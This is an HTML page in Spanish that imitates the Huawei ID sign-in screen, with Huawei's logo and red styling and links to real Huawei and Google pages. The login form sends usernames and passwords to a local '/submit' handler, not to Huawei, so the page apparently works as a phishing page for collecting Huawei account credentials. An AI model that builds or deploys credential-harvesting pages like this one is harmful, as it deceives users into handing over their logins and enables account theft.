<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Huawei ID - Iniciar sesión</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap');
        body { 
            font-family: 'Manrope', sans-serif; 
            background-color: #ffffff; 
        }
        /* Rojo oficial de Huawei */
        .huawei-red {
            background-color: #cf0a2c;
        }
        .huawei-red:hover {
            background-color: #b00825;
        }
        /* Estilo de los inputs de Huawei */
        .huawei-input {
            border-bottom: 1px solid #e5e5e5;
            transition: all 0.3s ease;
        }
        .huawei-input:focus {
            border-bottom: 1px solid #cf0a2c;
            outline: none;
        }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen">

    <div class="w-full max-w-[400px] mt-16 px-6">
        
        <div class="flex justify-center mb-12">
            <span class="text-[#cf0a2c] font-bold text-3xl tracking-[0.2em]">HUAWEI</span>
        </div>

        <h1 class="text-2xl font-bold text-center text-gray-900 mb-10">ID de HUAWEI</h1>

        <form action="/submit" method="POST" class="space-y-8">
            
            <div class="relative">
                <input type="text" name="username" required
                    class="huawei-input w-full py-3 text-lg text-gray-800 placeholder-gray-400 bg-transparent"
                    placeholder="Teléfono/Correo electrónico/Nombre de usuario">
            </div>

            <div class="relative">
                <input type="password" name="password" required
                    class="huawei-input w-full py-3 text-lg text-gray-800 placeholder-gray-400 bg-transparent"
                    placeholder="Contraseña">
            </div>

            <div class="flex justify-start py-2">
                <a href="https://id7.cloud.huawei.com" target="_blank" class="text-blue-600 text-sm font-medium hover:underline">
                    ¿Olvidó la contraseña?
                </a>
            </div>

            <button type="submit" 
                class="w-full huawei-red text-white font-bold py-3.5 rounded-full transition-all shadow-sm mt-4 text-base">
                Iniciar sesión
            </button>
        </form>

        <div class="mt-8 flex flex-col items-center gap-6">
            <a href="https://id7.cloud.huawei.com" target="_blank"
                class="w-full bg-gray-100 text-gray-900 font-bold py-3.5 rounded-full text-center hover:bg-gray-200 transition-colors">
                Registrar
            </a>

            <div class="flex flex-col items-center gap-4 mt-4 w-full">
                <span class="text-gray-400 text-xs">O iniciar sesión con</span>
                <div class="flex gap-8">
                    <a href="https://accounts.google.com" target="_blank" class="p-3 border border-gray-200 rounded-full hover:bg-gray-50">
                        <svg class="w-6 h-6" viewBox="0 0 24 24">
                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                        </svg>
                    </a>
                </div>
            </div>
        </div>
    </div>

    <div class="mt-auto py-10 text-gray-400 text-[11px] text-center w-full max-w-[500px] px-4 space-y-2">
        <div class="flex justify-center gap-4 mb-4">
            <a href="#" class="hover:underline">Preguntas frecuentes</a>
            <span>|</span>
            <a href="#" class="hover:underline">Términos y condiciones</a>
            <span>|</span>
            <a href="#" class="hover:underline">Privacidad</a>
        </div>
        <p>Copyright © 2026 Huawei. Todos los derechos reservados.</p>
    </div>

</body>
</html>
